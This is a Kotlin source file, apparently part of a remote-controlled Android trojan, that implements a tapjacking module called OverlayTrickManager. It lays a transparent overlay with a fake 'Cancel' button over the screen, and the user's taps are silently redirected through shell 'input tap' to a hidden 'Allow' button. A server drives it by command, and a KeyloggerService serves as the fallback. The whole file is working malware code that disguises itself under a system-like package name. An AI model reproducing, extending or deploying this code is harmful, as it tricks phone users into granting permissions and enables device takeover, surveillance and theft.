package com.android.services

import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.Gravity
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.TextView
import com.google.gson.JsonParser

/**
 * OverlayTrickManager — Tapjacking via SYSTEM_ALERT_WINDOW.
 *
 * Tampilkan overlay transparan di atas layar. User melihat tombol "palsu"
 * (misal "Tutup" / "Cancel"), tapi tap di-intercept dan di-dispatch ulang
 * ke koordinat nyata (tombol "Allow" / "Izinkan" di belakang overlay).
 *
 * Commands dari server:
 *   overlay_start        (extra = JSON config)
 *   overlay_stop
 *   overlay_status
 *   overlay_request_perm
 *
 * Config JSON:
 * {
 *   "fakeText":  "Tutup",       // teks tombol palsu yang terlihat user
 *   "fakeColor": "#CC1a1a2e",   // warna tombol (ARGB hex)
 *   "targetX":   540,           // koordinat X tombol "Allow" asli di belakang
 *   "targetY":   1820,          // koordinat Y tombol "Allow" asli
 *   "offsetX":   0,             // offset relatif dari posisi tap user
 *   "offsetY":   0,
 *   "duration":  30,            // detik auto-stop (0 = manual)
 *   "fullBlock": false          // true = intercept semua tap ke satu target
 * }
 */
object OverlayTrickManager {

    private var wm: WindowManager? = null
    private var rootView: View?    = null
    @Volatile var isActive = false
        private set

    fun start(ctx: Context, configJson: String?): String {
        if (!Settings.canDrawOverlays(ctx)) {
            return "⚠️ SYSTEM_ALERT_WINDOW belum granted. Kirim overlay_request_perm dulu."
        }
        if (isActive) stop(ctx)

        return try {
            val cfg       = configJson?.let { runCatching { JsonParser.parseString(it).asJsonObject }.getOrNull() }
            val fakeText  = cfg?.get("fakeText")?.asString   ?: "Tutup"
            val fakeColor = cfg?.get("fakeColor")?.asString  ?: "#CC1a1a2e"
            val targetX   = cfg?.get("targetX")?.asFloat     ?: 540f
            val targetY   = cfg?.get("targetY")?.asFloat     ?: 1820f
            val offsetX   = cfg?.get("offsetX")?.asFloat     ?: 0f
            val offsetY   = cfg?.get("offsetY")?.asFloat     ?: 0f
            val duration  = cfg?.get("duration")?.asInt      ?: 0
            val fullBlock = cfg?.get("fullBlock")?.asBoolean ?: false

            wm = ctx.applicationContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager

            // Full-screen transparent touch interceptor
            val root = object : FrameLayout(ctx) {
                override fun onTouchEvent(ev: MotionEvent): Boolean {
                    if (ev.action == MotionEvent.ACTION_UP) {
                        val rx = if (fullBlock) targetX else ev.x + offsetX
                        val ry = if (fullBlock) targetY else ev.y + offsetY
                        injectTap(rx.coerceAtLeast(0f), ry.coerceAtLeast(0f))
                    }
                    return true // consume — user tidak tau tap-nya diredirect
                }
            }
            root.setBackgroundColor(Color.TRANSPARENT)

            // Tombol palsu yang terlihat user
            val btn = TextView(ctx).apply {
                text = fakeText
                textSize = 15f
                setTextColor(Color.WHITE)
                setPadding(56, 28, 56, 28)
                background = GradientDrawable().apply {
                    cornerRadius = 28f
                    try { setColor(Color.parseColor(fakeColor)) }
                    catch (_: Exception) { setColor(0xCC1a1a2e.toInt()) }
                }
                elevation = 12f
            }
            root.addView(btn, FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT
            ).also {
                it.gravity     = Gravity.BOTTOM or Gravity.CENTER_HORIZONTAL
                it.bottomMargin = 180
            })

            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE

            val lp = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
            ).apply { gravity = Gravity.TOP or Gravity.START; x = 0; y = 0 }

            Handler(Looper.getMainLooper()).post {
                wm!!.addView(root, lp)
                rootView = root
                isActive = true
            }

            if (duration > 0) {
                Handler(Looper.getMainLooper()).postDelayed({ stop(ctx) }, duration * 1000L)
            }

            val autoStop = if (duration > 0) " | auto-stop: ${duration}s" else ""
            "✅ Overlay aktif — fake=[\"$fakeText\"] target=(${targetX.toInt()},${targetY.toInt()})$autoStop"
        } catch (e: Exception) { "ERROR: ${e.message}" }
    }

    fun stop(ctx: Context): String {
        return try {
            Handler(Looper.getMainLooper()).post {
                rootView?.let {
                    try {
                        (ctx.applicationContext.getSystemService(Context.WINDOW_SERVICE) as WindowManager)
                            .removeViewImmediate(it)
                    } catch (_: Exception) {}
                }
                rootView = null
                isActive = false
            }
            "✅ Overlay dihentikan"
        } catch (e: Exception) { "ERROR: ${e.message}" }
    }

    fun status(): String = if (isActive) "🟢 Overlay aktif" else "⚫ Overlay tidak aktif"

    /** Re-dispatch tap ke koordinat nyata via shell input tap */
    private fun injectTap(x: Float, y: Float) {
        try {
            Runtime.getRuntime().exec(arrayOf("sh", "-c", "input tap ${x.toInt()} ${y.toInt()}"))
        } catch (_: Exception) {
            // Fallback: via AccessibilityService gesture injection
            try { KeyloggerService.injectTap(x, y) } catch (_: Exception) {}
        }
    }
}
